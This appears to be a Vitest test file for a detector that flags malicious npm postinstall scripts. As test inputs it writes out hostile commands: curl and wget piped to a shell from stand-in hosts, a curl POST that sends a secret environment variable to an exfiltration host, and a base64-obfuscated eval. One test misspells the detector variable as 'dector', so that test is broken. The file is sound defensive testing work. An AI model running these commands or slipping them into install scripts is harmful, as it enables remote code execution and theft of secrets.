import { describe, it, expect, vi } from 'vitest';
import { PostInstallDetector } from '../../src/detectors/PostInstallDetector';

describe('PostInstallDetector (Expanded Tests)', () => {
  describe('script detection', () => {
    it('should detect postinstall scripts in package.json', () => {
      const detector = new PostInstallDetector();
      const packageJson = {
        scripts: {
          postinstall: 'node malicious-script.js'
        }
      };
      expect(dector.detectPostInstall(packageJson)).toBe(true);
    });

    it('should ignore harmless scripts', () => {
      const detector = new PostInstallDetector();
      const packageJson = {
        scripts: {
          start: 'node app.js',
          test: 'vitest'
        }
      };
      expect(detector.detectPostInstall(packageJson)).toBe(false);
    });

    it('should detect variations of postinstall', () => {
      const detector = new PostInstallDetector();
      const packageJson = {
        scripts: {
          'post-install': 'malicious-code',
          'after-install': 'dangerous-script'
        }
      };
      expect(detector.detectPostInstall(packageJson)).toBe(true);
    });
  });

  describe('malicious pattern detection', () => {
    it('should detect download and execute patterns', () => {
      const detector = new PostInstallDetector();
      const script = 'curl http://malicious.com/script.sh | bash';
      expect(detector.isMaliciousScript(script)).toBe(true);
    });

    it('should detect wget and execute patterns', () => {
      const detector = new PostInstallDetector();
      const script = 'wget -O - http://bad.com/payload | sh';
      expect(detector.isMaliciousScript(script)).toBe(true);
    });

    it('should detect environment variable exfiltration', () => {
      const detector = new PostInstallDetector();
      const script = 'curl -X POST -d "$SECRET_KEY" http://exfil.com';
      expect(detector.isMaliciousScript(script)).toBe(true);
    });

    it('should allow safe installation commands', () => {
      const detector = new PostInstallDetector();
      const script = 'npm run build && npm test';
      expect(detector.isMaliciousScript(script)).toBe(false);
    });
  });

  describe('command parsing', () => {
    it('should handle complex command chains', () => {
      const detector = new PostInstallDetector();
      const script = 'safe-command && curl http://evil.com | bash && echo "done"';
      expect(detector.isMaliciousScript(script)).toBe(true);
    });

    it('should detect obfuscated commands', () => {
      const detector = new PostInstallDetector();
      const script = 'eval $(echo "Y3VybCB8IGJhc2g=" | base64 -d)';
      expect(detector.isMaliciousScript(script)).toBe(true);
    });

    it('should allow package manager commands', () => {
      const detector = new PostInstallDetector();
      const script = 'npm install && npm run build';
      expect(detector.isMaliciousScript(script)).toBe(false);
    });
  });
});